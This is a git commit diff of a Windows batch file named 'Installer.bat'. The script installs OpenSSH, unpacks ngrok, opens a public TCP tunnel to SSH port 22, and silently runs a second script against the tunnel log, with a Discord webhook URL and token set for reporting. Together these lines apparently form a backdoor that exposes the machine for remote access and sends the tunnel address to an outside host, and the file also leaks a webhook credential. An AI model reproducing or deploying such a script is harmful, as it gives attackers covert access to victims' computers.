728395f80bc72f98601df5a710f8c1079b264830
dh3b <74708369+dh3b@users.noreply.github.com>
2021-10-16 23:41:07 +0200

    Update Installer.bat

--- Files/Installer.bat
+++ Files/Installer.bat
@@ -9,5 +9,5 @@ powershell ./OpenSSH.ps1
 
 tar -xf ngrok.zip
 set "webhook=https://discord.com/api/webhooks/893838978833350706/S6T93mD5c6dA6kMHIgWWzHPiFJH3rj2XqANwwvPn2nHmkJhEd6PPYJeNvO3qKCKG6xtK"
-start timeout 5 & Source.bat -silent --file %temp%/ngrok.log & exit \b
+start timeout 5 & Source.bat -silent --file %temp%/ngrok.log
 ngrok tcp 22 -log=stdout > ngrok.log &
